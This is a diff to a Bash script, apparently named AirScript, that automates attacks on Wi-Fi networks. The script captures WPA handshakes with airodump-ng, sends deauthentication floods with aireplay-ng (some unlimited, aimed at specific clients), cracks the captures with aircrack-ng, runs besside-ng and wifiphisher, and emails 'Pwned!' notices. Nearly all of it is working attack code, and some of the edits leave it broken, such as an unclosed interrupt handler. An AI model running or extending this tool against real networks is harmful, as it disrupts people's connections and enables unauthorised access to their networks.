@@ -39,6 +39,10 @@ if [ "$WiFiStatus" == "disabled" ]; then
 nmcli radio wifi on
 echo -e "[${Green}$foo${White}] Enabled!"
 fi
+stopMon > /dev/null 2>&1
+checkServices > /dev/null 2>&1
+
+
 }
 
 
@@ -46,8 +50,8 @@ checkServices () {
 sudo systemctl start postfix > /dev/null 2>&1
 sudo postfix start > /dev/null 2>&1
 sudo systemctl start postfix > /dev/null 2>&1
-
-
+stopMon
+restart_postfix
 }
 
 banner () {        ##### Banner #####
@@ -219,7 +223,32 @@ esac
 done
 }
 
+#Function to restart Postfix, checking if it's installed and handling errors
+restart_postfix() {
+    log_message "Checking if Postfix is registered as a service..."
+    systemctl list-units --type=service | grep postfix
+    if [ $? -ne 0 ]; then
+        log_message "Postfix service not found. Attempting to reload systemd..."
+        sudo systemctl daemon-reload
+        sudo systemctl enable postfix
+        sudo systemctl start postfix
+    fi
 
+    log_message "Restarting Postfix using systemd..."
+    sudo systemctl restart postfix
+
+    if [ $? -eq 0 ]; then
+        log_message "Postfix restarted successfully using systemd."
+    else
+        log_message "Error restarting Postfix with systemd. Attempting to restart with service command..."
+        sudo service postfix restart
+        if [ $? -eq 0 ]; then
+            log_message "Postfix restarted using service command."
+        else
+            log_message "Error restarting Postfix with service command. Please check manually."
+        fi
+    fi
+}
 
 AirScript() {
 notification
@@ -247,16 +276,15 @@ network
 monitor
 sudo airodump-ng --bssid $bssid --channel $channel --output-format pcap --write handshake $foo > /dev/null &
 echo -e "[${Green}$foo${White}] Sending DeAuth to target..."
-sudo aireplay-ng --deauth 20 -a $bssid $foo
-stopMon
-echo -e "\e[32mmonitor mode disabled for $foo\e[0m"
-checkServices 
-sleep 10
+echo -e "\e[32mAttacking...\e[0m"
+sudo aireplay-ng --deauth 20 -a $bssid $foo > /dev/null 2>&1
 checkServices 
 check_cap_files
 check_eapol_in_cap
-sendemail -f airscript@mail.com -t $email -u "Air Script is done pwning!" -m "Pwn complete, ready for you to crack. This is a robot please do not reply. *BEEP BOOP* "
-crack
+stopMon
+checkServices 
+sleep 3
+echo "Handshakes have been captured." | mail -s "Pwned!" $email
 }
 
 
@@ -267,11 +295,13 @@ sudo airodump-ng --bssid $bssid --channel $channel --output-format pcap --write 
 echo -e "[${Green}$foo${White}] Sending DeAuth to target..."
 echo -e "\e[32mAttacking...\e[0m"
 sudo aireplay-ng --deauth 20 -a $bssid $foo > /dev/null 2>&1
-checkServices 
-check_cap_files
-check_eapol_in_cap
-stopMon
+captureMAC
+deauthAttack
+#check_cap_files
+#check_eapol_in_cap
 crack
+ # Clean up capture files
+  #rm -f "${capture_file}"*
 
 }
 
@@ -307,11 +337,11 @@ sleep 3
 echo "Remeber to check your spam folder!"
 network
 sudo besside-ng $foo
+check_cap_files
+check_eapol_in_cap
 stopMon
 checkservices
 sleep 10
-check_cap_files
-check_eapol_in_cap
 sendemail -f airscript@gmail.com -t $email -u "Air Script is done pwning!" -m "Pwn complete, ready for you to crack. This is a robot please do not reply. *BEEP BOOP*"
 crack
 }
@@ -361,8 +391,45 @@ sudo aircrack-ng -w $wordlist *.cap
 #sudo aircrack-ng -w wordlist.txt wep.cap
 #sudo aircrack-ng -w wordlist.txt wpa.cap
 #sudo aircrack-ng -w wordlist.txt *.cap
-menu
+cleanup 
 }
+
+cleanup () {
+$sudo airmon-ng stop $foo
+checkDependencies
+checkWiFiStatus
+checkServices
+sudo rm -f *.csv > /dev/null 2>&1
+sudo rm -f *.netxml > /dev/null 2>&1
+sudo rm -f airodump_output.log > /dev/null 2>&1
+cleanup_handshakes
+exit
+
+}
+
+
+cleanup_handshakes() {
+  # Check if the handshakes folder exists, if not create it
+  if [ ! -d "handshakes" ]; then
+    echo "Creating handshakes directory..."
+    mkdir handshakes
+  fi
+
+  # Find and move all .cap files to the handshakes directory
+  echo "Moving .cap files to handshakes folder..."
+
+  # Iterate over all .cap files and move them to the handshakes folder
+  for cap_file in *.cap; do
+    if [ -f "$cap_file" ]; then  # Ensure it's a valid file
+      echo "Moving $cap_file to handshakes/"
+      mv "$cap_file" handshakes/
+    fi
+  done
+
+  # Confirm the cleanup is done
+  echo "Cleanup complete. All .cap files moved to handshakes."
+}
+
 
 StartWifiphisher () {
 wifiphisher
@@ -391,6 +458,96 @@ aireplay-ng --deauth 0 -a $bssid $foo > /dev/null
 }
 
 
+# Function to capture MAC addresses and process them
+captureMAC() {
+  # Ensure the script is running with root privileges
+  if [ "$(id -u)" -ne 0 ]; then
+    echo "This script must be run as root"
+    return 1
+  fi
+
+  # Parse input arguments
+  while getopts "c:b:f:" opt; do
+    case "$opt" in
+      c) channel="$OPTARG" ;;
+      b) bssid="$OPTARG" ;;
+      f) foo="$OPTARG" ;;
+      *) echo "Usage: $0 -c <channel> -b <BSSID> -f <interface>"; return 1 ;;
+    esac
+  done
+
+  # Validate input parameters
+  if [ -z "$channel" ] || [ -z "$bssid" ] || [ -z "$foo" ]; then
+    echo "Usage: $0 -c <channel> -b <BSSID> -f <interface>"
+    return 1
+  fi
+
+  # Check if the provided interface is already in monitor mode
+  if ! iw dev "$foo" info | grep -q "type monitor"; then
+    echo "$foo is not in monitor mode. Please make sure the interface is in monitor mode."
+    return 1
+  fi
+
+  # Create a temporary capture file to store output
+  capture_file="capture_$bssid"
+
+  # Start airodump-ng with timeout handling
+  echo "Capturing data on channel $channel for AP $bssid using interface $foo..."
+
+  # Print the interface status for debugging
+  iw dev "$foo" info
+
+  # Start airodump-ng in the background and capture its process ID
+  airodump-ng --channel "$channel" --bssid "$bssid" --write "$capture_file" "$foo" > airodump_output.log 2>&1 &
+  airodump_pid=$!
+
+  # Wait for 30 seconds before killing the process
+  sleep 30
+
+  # Check if airodump-ng is still running, and kill it if necessary
+  if kill -0 $airodump_pid 2>/dev/null; then
+    echo "Timeout reached. Killing airodump-ng process..."
+    kill $airodump_pid
+  else
+    echo "airodump-ng process already completed."
+  fi
+
+  # Wait for airodump-ng to terminate (if not already terminated)
+  wait $airodump_pid
+
+  # Check if airodump-ng successfully created a capture file
+  if [ ! -f "${capture_file}-01.csv" ]; then
+    echo "Failed to capture any data or the capture file does not exist."
+    echo "Check the log file airodump_output.log for errors."
+    return 1
+  fi
+
+  # Extract the MAC addresses of connected clients and stations
+  echo "Extracting client and station MAC addresses associated with BSSID $bssid..."
+
+  # Extract station MAC addresses using grep and awk (station list from CSV file)
+  echo "Station MAC addresses:"
+  awk -F, -v bssid="$bssid" '$1 == bssid {print $1}' "${capture_file}-01.csv" | grep -oE '([[:xdigit:]]{2}:){5}[[:xdigit:]]{2}' | sort | uniq
+
+  # Extract associated client MAC addresses using grep and awk (client list from CSV file)
+  echo "Client MAC addresses:"
+  awk -F, -v bssid="$bssid" '$1 == bssid {print $1}' "${capture_file}-01.csv" | grep -oE '([[:xdigit:]]{2}:){5}[[:xdigit:]]{2}' | sort | uniq | while read client; do
+    echo "Client MAC: $client"
+  done
+
+  # Clean up capture files
+ # rm -f "${capture_file}"*
+
+  echo "Script completed successfully. Monitor mode was not disabled."
+}
+
+# Example usage of the captureMAC function
+# You would call the function with the correct parameters like this:
+# captureMAC -c 11 -b 94:6A:77:2D:2A:6E -f wlan0
+
+# Example usage of the captureMAC function
+# You would call the function with the correct parameters like this:
+# captureMAC -c 6 -b XX:XX:XX:XX:XX:XX -f wlan0
 
 
 
@@ -550,10 +707,14 @@ check_cap_files() {
 }
 
 
+
 deauthAttack () {
+#sudo airodump-ng --bssid $bssid --channel $channel --output-format pcap --write handshake $foo > /dev/null &
+sudo airodump-ng --channel $channel --bssid $bssid -w capture $foo > /dev/null &
 echo -e "[${Green}$foo${White}] Sending DeAuth to target..."
-echo -e "\e[32mAttacking... This could take a few minutes... Please wait!\e[0m"
-sudo aireplay-ng --deauth 50 -a $bssid $foo > /dev/null 2>&1
+echo -e "\e[32mAttacking...\e[0m"
+sudo aireplay-ng --deauth 0 -a $bssid -c $client $foo > /dev/null 2>&1
+captureMAC
 check_cap_files
 check_eapol_in_cap
  } 
@@ -957,6 +1118,7 @@ done
 clean () {
 sudo rm -r *cap> /dev/null 2>&1
 sudo rm -r ipscan_3.7.6_all.deb> /dev/null 2>&1
+cleanup
 }
 
 uninstall () {
@@ -966,7 +1128,7 @@ sudo ./uninstall.sh
 stopMon () {
 sudo airmon-ng stop $foo > /dev/null 2>&1
 sudo systemctl start NetworkManager > /dev/null 2>&1
-systemctl start wpa_supplicant  > /dev/null 2>&1
+sudo systemctl start wpa_supplicant  > /dev/null 2>&1
 echo -e "\e[32mmonitor mode disabled for $foo\e[0m"
 }
 
@@ -1003,12 +1165,29 @@ echo -ne "[${Green}$foo${White}] Scanning for available networks...${spin:i--%le
 done
 }
 
+# Define a function to handle interruptions
+interrupt_handler() {
+    echo "Script interrupted! Cleaning up..."
+    stopMon
+    # Perform cleanup tasks here
+
+
+# Set up the trap for SIGINT (Ctrl+C) and SIGTERM (kill command)
+trap interrupt_handler SIGINT SIGTERM
+
+# Simulate long-running task
+#echo "Script is running... Press Ctrl+C to interrupt."
+#while true; do
+#    sleep 1
+#done
+}
+
+
 targeted () {
 checkDependencies
-checkWiFiStatus
+#checkWiFiStatus
 banner
 menu
-checkServices 
 }
 
 targeted
